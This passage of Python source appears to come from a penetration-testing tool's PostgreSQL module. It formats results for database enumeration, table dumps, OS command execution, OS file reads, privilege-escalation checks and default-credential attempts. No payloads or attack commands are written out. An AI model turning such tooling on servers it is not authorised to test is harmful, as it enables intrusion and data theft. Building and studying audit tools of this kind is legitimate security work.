                ensure_ascii=False,
            )
        ]

    prefix = _nxc_prefix(record)
    if limit is not None and len(database_names) > len(displayed_database_names):
        lines = [f"{prefix} [*] Dump Databases (showing:{len(displayed_database_names)} of {len(database_names)})"]
    else:
        lines = [f"{prefix} [*] Dump Databases"]
    for database_name in displayed_database_names:
        lines.append(f"{prefix} {str(database_name)}")
    return lines


def _format_table_columns_detail_records(record: dict[str, Any], output_format: str) -> list[str]:
    table_columns_info = record.get("table_columns_info")
    if not isinstance(table_columns_info, list) or not table_columns_info:
        return []
    raw_limit = record.get("show_columns_limit")
    limit = raw_limit if isinstance(raw_limit, int) and not isinstance(raw_limit, bool) else None

    if output_format == "json":
        lines: list[str] = []
        for item in table_columns_info:
            if not isinstance(item, dict):
                continue
            columns = item.get("columns")
            column_names = [str(column) for column in columns] if isinstance(columns, list) else []
            column_meta = limit_metadata(column_names, limit)
            lines.append(
                json.dumps(
                    {
                        "timestamp": record.get("timestamp"),
                        "type": "table_columns",
                        "service": "postgres",
                        "host": record.get("host"),
                        "port": record.get("port"),
                        "database": item.get("database") or record.get("database"),
                        "table": str(item.get("table") or ""),
                        "columns": limit_sequence(column_names, limit),
                        "columns_shown": column_meta["shown"],
                        "columns_limit": column_meta["limit"],
                        "columns_truncated": column_meta["truncated"],
                        "error": str(item.get("error")) if item.get("error") else None,
                    },
                    ensure_ascii=False,
                )
            )
        return lines

    prefix = _nxc_prefix(record)
    lines: list[str] = []
    for item in table_columns_info:
        if not isinstance(item, dict):
            continue
        table_name = str(item.get("table") or "").strip() or "<unknown>"
        lines.append(f"{prefix} [*] Table Columns {table_name}")
        column_error = item.get("error")
        if column_error:
            lines.append(f"{prefix} <error:{_pg_text(column_error)}>")
            continue
        columns = item.get("columns")
        if isinstance(columns, list) and columns:
            column_names = [str(column_name) for column_name in columns]
            displayed_columns = limit_sequence(column_names, limit)
            if limit is not None and len(column_names) > len(displayed_columns):
                lines[-1] = (
                    f"{prefix} [*] Table Columns {table_name} (showing:{len(displayed_columns)} of {len(column_names)})"
                )
            for column_name in displayed_columns:
                lines.append(f"{prefix} {str(column_name)}")
        else:
            lines.append(f"{prefix} <no columns>")
    return lines


def _format_table_row_count_detail_records(record: dict[str, Any], output_format: str) -> list[str]:
    if not record.get("show_row_counts"):
        return []
    if output_format == "txt" and record.get("show_tables"):
        return []

    table_row_counts = record.get("table_row_counts")
    if not isinstance(table_row_counts, list) or not table_row_counts:
        return []

    if output_format == "json":
        lines: list[str] = []
        for item in table_row_counts:
            if not isinstance(item, dict):
                continue
            lines.append(
                json.dumps(
                    {
                        "timestamp": record.get("timestamp"),
                        "type": "table_rows",
                        "service": "postgres",
                        "host": record.get("host"),
                        "port": record.get("port"),
                        "database": item.get("database") or record.get("database"),
                        "table": str(item.get("table") or ""),
                        "row_count": item.get("row_count"),
                        "error": str(item.get("error")) if item.get("error") else None,
                    },
                    ensure_ascii=False,
                )
            )
        return lines

    prefix = _nxc_prefix(record)
    lines = [f"{prefix} [*] Table Rows"]
    for item in table_row_counts:
        if not isinstance(item, dict):
            continue
        table_name = str(item.get("table") or "").strip() or "<unknown>"
        row_error = item.get("error")
        if row_error:
            lines.append(f"{prefix} {table_name} <error:{_pg_text(row_error)}>")
            continue
        row_count = item.get("row_count")
        row_count_text = str(row_count) if isinstance(row_count, int) else "unknown"
        lines.append(f"{prefix} {table_name} (rows:{row_count_text})")
    return lines


def _format_table_dump_detail_records(record: dict[str, Any], output_format: str) -> list[str]:
    if not record.get("table_dump_enabled"):
        return []
    table_dumps = record.get("table_dumps")
    if not isinstance(table_dumps, list) or not table_dumps:
        return []
    table_columns = record.get("table_columns")
    selected_columns = (
        [str(item) for item in table_columns] if isinstance(table_columns, list) and table_columns else []
    )
    columns_label = ",".join(selected_columns)
    dump_row_limit = record.get("dump_row_limit")

    if output_format == "json":
        lines: list[str] = []
        for item in table_dumps:
            if not isinstance(item, dict):
                continue
            table_name = str(item.get("table") or "")
            lines.append(
                json.dumps(
                    {
                        "timestamp": record.get("timestamp"),
                        "type": "table_dump",
                        "service": "postgres",
                        "host": record.get("host"),
                        "port": record.get("port"),
                        "database": item.get("database") or record.get("database"),
                        "table": table_name,
                        "columns": [str(col) for col in item.get("columns") or selected_columns or []],
                        "row_limit": dump_row_limit,
                        "rows": [str(row) for row in item.get("rows") or []],
                        "error": str(item.get("error")) if item.get("error") else None,
                    },
                    ensure_ascii=False,
                )
            )
        return lines

    prefix = _nxc_prefix(record)
    lines: list[str] = []
    for item in table_dumps:
        if not isinstance(item, dict):
            continue
        table_name = str(item.get("table") or "").strip() or "<unknown>"
        item_columns = [str(col) for col in item.get("columns") or []]
        header_columns = item_columns or [str(col) for col in selected_columns or []]
        header_parts: list[str] = []
        if columns_label:
            header_parts.append(f"columns:{columns_label}")
        elif item_columns:
            header_parts.append("columns:auto")
        if isinstance(dump_row_limit, int):
            header_parts.append(f"limit:{dump_row_limit}")
        if header_parts:
            lines.append(f"{prefix} [*] Dump Table {table_name} ({' '.join(header_parts)})")
        else:
            lines.append(f"{prefix} [*] Dump Table {table_name}")
        if header_columns:
            lines.append(f"{prefix} [{', '.join(header_columns)}]")

        table_error = item.get("error")
        if table_error:
            lines.append(f"{prefix} <error:{_pg_text(table_error)}>")
            continue

        table_rows = item.get("rows")
        if isinstance(table_rows, list) and table_rows:
            for table_row in table_rows:
                lines.append(f"{prefix} {_pg_text(table_row)}")
        else:
            lines.append(f"{prefix} <no rows>")
    return lines


def _format_execute_detail_records(record: dict[str, Any], output_format: str) -> list[str]:
    execute_command = record.get("execute_command")
    if not execute_command:
        return []

    execute_ok = record.get("execute_ok")
    execute_output = record.get("execute_output")
    execute_error = record.get("execute_error")

    if output_format == "json":
        return [
            json.dumps(
                {
                    "timestamp": record.get("timestamp"),
                    "type": "execute_dump",
                    "service": "postgres",
                    "host": record.get("host"),
                    "port": record.get("port"),
                    "database": record.get("database"),
                    "command": str(execute_command),
                    "ok": execute_ok,
                    "output": [str(item) for item in execute_output] if isinstance(execute_output, list) else [],
                    "error": str(execute_error) if execute_error else None,
                },
                ensure_ascii=False,
            )
        ]

    prefix = _nxc_prefix(record)
    lines = [f"{prefix} [*] Execute Command", f"{prefix} command={_pg_text(execute_command)}"]
    if execute_ok is True:
        if isinstance(execute_output, list) and execute_output:
            for line in execute_output:
                lines.append(f"{prefix} {_pg_text(line)}")
        else:
            lines.append(f"{prefix} <no output>")
    elif execute_ok is False:
        lines.append(f"{prefix} <error:{_pg_text(execute_error or 'execute failed')}>")
    else:
        lines.append(f"{prefix} <not attempted>")
    return lines


def _format_sql_detail_records(record: dict[str, Any], output_format: str) -> list[str]:
    sql_command = record.get("sql_command")
    if not sql_command:
        return []

    sql_ok = record.get("sql_ok")
    sql_output = record.get("sql_output")
    sql_error = record.get("sql_error")

    if output_format == "json":
        return [
            json.dumps(
                {
                    "timestamp": record.get("timestamp"),
                    "type": "sql_dump",
                    "service": "postgres",
                    "host": record.get("host"),
                    "port": record.get("port"),
                    "database": record.get("database"),
                    "query": str(sql_command),
                    "ok": sql_ok,
                    "output": [str(item) for item in sql_output] if isinstance(sql_output, list) else [],
                    "error": str(sql_error) if sql_error else None,
                },
                ensure_ascii=False,
            )
        ]

    prefix = _nxc_prefix(record)
    lines = [f"{prefix} [*] SQL Query", f"{prefix} query={_pg_text(sql_command)}"]
    if sql_ok is True:
        if isinstance(sql_output, list) and sql_output:
            for line in sql_output:
                lines.append(f"{prefix} {_pg_text(line)}")
        else:
            lines.append(f"{prefix} <ok>")
    elif sql_ok is False:
        lines.append(f"{prefix} <error:{_pg_text(sql_error or 'query failed')}>")
    else:
        lines.append(f"{prefix} <not attempted>")
    return lines


def _format_os_read_detail_records(record: dict[str, Any], output_format: str) -> list[str]:
    os_read_path = record.get("os_read_path")
    if not os_read_path:
        return []

    os_read_ok = record.get("os_read_ok")
    os_read_output = record.get("os_read_output")
    os_read_error = record.get("os_read_error")
    os_read_method = record.get("os_read_method")
    os_read_methods = record.get("os_read_methods")

    if output_format == "json":
        return [
            json.dumps(
                {
                    "timestamp": record.get("timestamp"),
                    "type": "os_read_dump",
                    "service": "postgres",
                    "host": record.get("host"),
                    "port": record.get("port"),
                    "database": record.get("database"),
                    "path": str(os_read_path),
                    "ok": os_read_ok,
                    "method": str(os_read_method) if os_read_method else None,
                    "output": [str(item) for item in os_read_output] if isinstance(os_read_output, list) else [],
                    "error": str(os_read_error) if os_read_error else None,
                    "methods": os_read_methods if isinstance(os_read_methods, list) else [],
                },
                ensure_ascii=False,
            )
        ]

    prefix = _nxc_prefix(record)
    lines = [f"{prefix} [*] OS Read", f"{prefix} path={_pg_text(os_read_path)}"]
    if os_read_method:
        lines.append(f"{prefix} method={_pg_text(os_read_method)}")
    if os_read_ok is True:
        if isinstance(os_read_output, list) and os_read_output:
            for line in os_read_output:
                lines.append(f"{prefix} {_pg_text(line)}")
        else:
            lines.append(f"{prefix} <empty file>")
    elif os_read_ok is False:
        lines.append(f"{prefix} <error:{_pg_text(os_read_error or 'os-read failed by both methods')}>")
    else:
        lines.append(f"{prefix} <not attempted>")
    return lines


def _format_privesc_detail_records(record: dict[str, Any], output_format: str, *, debug: bool = False) -> list[str]:
    if not record.get("privesc_check"):
        return []

    checks = record.get("privesc_checks")
    if not isinstance(checks, list):
        checks = []
    summary = record.get("privesc_summary") if isinstance(record.get("privesc_summary"), dict) else {}

    if output_format == "json":
        return [
            json.dumps(
                {
                    "timestamp": record.get("timestamp"),
                    "type": "privesc_check",
                    "service": "postgres",
                    "host": record.get("host"),
                    "port": record.get("port"),
                    "database": record.get("database"),
                    "summary": summary,
                    "checks": checks,
                },
                ensure_ascii=False,
            )
        ]

    prefix = _nxc_prefix(record)
    lines = [f"{prefix} [*] PrivEsc Check"]
    if not checks:
        lines.append(f"{prefix} <no privesc checks available>")
        return lines

    finding_count = 0
    for item in checks:
        if not isinstance(item, dict):
            continue
        severity = str(item.get("severity") or "UNKNOWN").upper()
        name = _pg_text(item.get("name") or item.get("id") or "check")
        description = _pg_text(item.get("description") or "")
        title = f"{name} - {description}" if description else name
        vulnerable = item.get("vulnerable")
        if debug:
            result = "True" if vulnerable is True else "False" if vulnerable is False else "unknown"
            marker = "[!]" if vulnerable is True else "[d]"
            evidence = _pg_text(item.get("evidence") or "-")
            error = _pg_text(item.get("error") or "")
            suffix = f" error={error}" if error else ""
            lines.append(f"{prefix} {marker} {severity} - {title} result:{result} evidence={evidence}{suffix}")
            if vulnerable is True:
                finding_count += 1
            continue
        if vulnerable is True:
            finding_count += 1
            lines.append(f"{prefix} [!] {severity} - {title}")
    if finding_count == 0:
        lines.append(f"{prefix} <no privesc findings>")
    return lines


def _format_record(record: dict[str, Any], output_format: str) -> str:
    if output_format == "json":
        payload = dict(record)
        payload.pop("provided_password", None)
        return json.dumps(payload, ensure_ascii=False)

    status = str(record.get("status") or "fail")
    prefix = _nxc_prefix(record)
    err = _clip(str(record.get("error") or "-"), 72)

    if status == "open_no_auth":
        return f"{prefix} [+] anonymous access {_caps_suffix(record)}"

    if status == "weak_default_creds":
        username = str(record.get("effective_username") or "postgres")
        default_password = next(
            (password for user, password in _POSTGRES_DEFAULT_CREDENTIALS if user == username),
            "postgres",
        )
        return f"{prefix} [+] {username}:{default_password} {_caps_suffix(record)}"

    if status == "valid_credentials":
        username = str(record.get("effective_username") or "postgres")
        provided_password = record.get("provided_password")
        password_text = (
            "<empty>"
            if provided_password == ""
            else str(provided_password)
            if provided_password is not None
            else "<none>"
        )
        return f"{prefix} [+] {username}:{password_text} {_caps_suffix(record)}"

    if status == "auth_required":
        if record.get("provided_credentials"):
            username = str(record.get("effective_username") or "postgres")
            provided_password = record.get("provided_password")
            password_text = (
                "<empty>"
                if provided_password == ""
                else str(provided_password)
                if provided_password is not None
                else "<none>"
            )
            return f"{prefix} [-] {username}:{password_text}"
        elif record.get("defcreds_enabled"):
            username = str(record.get("effective_username") or "postgres")
            default_password = next(
                (password for user, password in _POSTGRES_DEFAULT_CREDENTIALS if user == username),
                "postgres",
            )
            return f"{prefix} [-] {username}:{default_password}"
        else:
            return f"{prefix} [-] authentication required"

    fail_line = f"{prefix} [!] connection failed"
    return f"{fail_line} err={err}" if err != "-" else fail_line


def _postgres_extra_color_spans(_marker: str, payload: str) -> list[tuple[int, int, str]]:
    if payload.startswith(("CRITICAL - ", "HIGH - ", "MEDIUM - ")):
        return [(0, len(payload), "orange")]
    return []


def _render_colored_postgres_line(console: Console, line: str) -> bool:
    return render_colored_marker_line(
        console,
        line,
        tag="POSTGRES",
        booleans=(
            BooleanColorRule("superuser"),
            BooleanColorRule("execute"),
            BooleanColorRule("read"),
        ),
        counts=(CountColorRule("DBs", "orange"),),
        extra_spans=_postgres_extra_color_spans,
    )


def _call_audit_postgres_host_with_stage_debug(
    host: str,
    port: int,
    timeout: float,
    retries: int,
    username: str | None,
    password: str | None,
    defcreds: bool,
    database: str | None,
    show_databases: bool,
    show_tables: bool,
    show_row_counts: bool,
    show_columns: bool,
    table_targets: list[str],
    table_targets_by_database: dict[str | None, list[str]],
    table_columns: list[str],
    dump_table_rows: bool,
    dump_row_limit: int | None,
    execute_command: str | None,
    sql_command: str | None,
    os_read_path: str | None = None,
    privesc_check: bool = False,
    show_databases_limit: int | None = None,
    show_tables_limit: int | None = None,
    show_columns_limit: int | None = None,
    *,
    run_deep_checks: bool,
    debug: bool,
    debug_emit: Callable[[str], None] | None,
) -> dict[str, Any]:
    started = time.monotonic()
    record = _audit_postgres_host(
        host,
        port,
        timeout,
        retries,
        username,
        password,
        defcreds,
        database,
        show_databases if run_deep_checks else False,
        show_tables if run_deep_checks else False,
        show_row_counts if run_deep_checks else False,
        show_columns if run_deep_checks else False,
        table_targets if run_deep_checks else [],
        table_targets_by_database if run_deep_checks else {},
        table_columns if run_deep_checks else [],
        dump_table_rows if run_deep_checks else False,
        dump_row_limit if run_deep_checks else None,
        execute_command if run_deep_checks else None,
        sql_command if run_deep_checks else None,
        os_read_path if run_deep_checks else None,
        privesc_check if run_deep_checks else False,
        show_databases_limit=show_databases_limit if run_deep_checks else None,
        show_tables_limit=show_tables_limit if run_deep_checks else None,
        show_columns_limit=show_columns_limit if run_deep_checks else None,
    )

    result: dict[str, Any] = dict(record)
    status = str(result.get("status") or "fail")
    is_postgres = bool(result.get("is_postgres"))
    attempts = max(1, retries + 1)
    elapsed_ms = int((time.monotonic() - started) * 1000)
    telemetry = StageTelemetryBuilder(host=host, port=port, attempts=attempts, debug=debug, debug_emit=debug_emit)

    if attempts > 1 and status == "fail":
        telemetry.retry(_STAGE_DETECT_PROTOCOL, 1, _retry_delay(0), "error")

    detect_result = "ok" if is_postgres else ("error" if status == "fail" else "skip")
    detect_error = str(result.get("error") or "") if detect_result == "error" else None
    telemetry.stage(_STAGE_DETECT_PROTOCOL, detect_result, detect_error, 0)

    auth_result = "ok" if is_postgres and status in _POSTGRES_DEEP_STATUSES.union({"auth_required"}) else detect_result
    telemetry.stage(_STAGE_AUTH_INFERENCE, auth_result, detect_error if auth_result == "error" else None, 0)

    if run_deep_checks and status in _POSTGRES_DEEP_STATUSES:
        telemetry.stage(_STAGE_ACCESS_CAPABILITIES, "ok", None, 0)
        data_result = "error" if status == "fail" and result.get("error") else "ok"
        telemetry.stage(
            _STAGE_DATA,
            data_result,
            str(result.get("error") or "") if data_result == "error" else None,
            elapsed_ms,
        )
    else:
        telemetry.stage(_STAGE_ACCESS_CAPABILITIES, "skip", "deep checks disabled", 0)
        telemetry.stage(_STAGE_DATA, "skip", "deep checks disabled", 0)

    stage_durations_ms = {
        str(item.get("stage_name") or ""): int(item.get("duration_ms") or 0) for item in telemetry.stages
    }
    telemetry.debug(
        f"stage_timing_summary status={status} attempts=1/{attempts} "
        f"detect_ms={stage_durations_ms.get(_STAGE_DETECT_PROTOCOL, 0)} "
        f"auth_ms={stage_durations_ms.get(_STAGE_AUTH_INFERENCE, 0)} "
        f"capabilities_ms={stage_durations_ms.get(_STAGE_ACCESS_CAPABILITIES, 0)} "
        f"data_ms={stage_durations_ms.get(_STAGE_DATA, 0)} total_ms={elapsed_ms}"
    )

    return telemetry.attach(result, status=status, total_ms=elapsed_ms)


def _merge_stage2_record(detect_record: dict[str, Any], deep_record: dict[str, Any]) -> dict[str, Any]:
    return merge_stage_records(detect_record, deep_record)


def _postgres_credential_runs(
    username: str | None,
    password: str | None,
    *,
    defcreds: bool,
) -> list[tuple[str | None, str | None, bool]]:
    runs: list[tuple[str | None, str | None, bool]] = []
    seen: set[tuple[str | None, str | None, bool]] = set()

    def add(run_username: str | None, run_password: str | None, is_default: bool) -> None:
        item = (run_username, run_password, is_default)
        if item in seen:
            return
        seen.add(item)
        runs.append(item)

    if username is not None or password is not None:
        add(username, password, False)
    if defcreds:
        for default_username, default_password in _POSTGRES_DEFAULT_CREDENTIALS:
            add(default_username, default_password, True)
    if not runs:
        add(username, password, False)
    return runs


# Typed runner boundary -----------------------------------------------------
def record_from_mapping(payload: dict[str, Any]) -> AuditRecord:
    """Convert legacy protocol payloads at the typed runtime boundary."""

    return AuditRecord.from_mapping(payload, module="postgres", service="postgres")


def host_hook(ctx: AuditHookContext) -> AuditRecord:
    """Typed host hook consumed by AuditCommandRunner."""

    return invoke_action_hook_from_args(sys.modules[__name__], module="postgres", ctx=ctx)
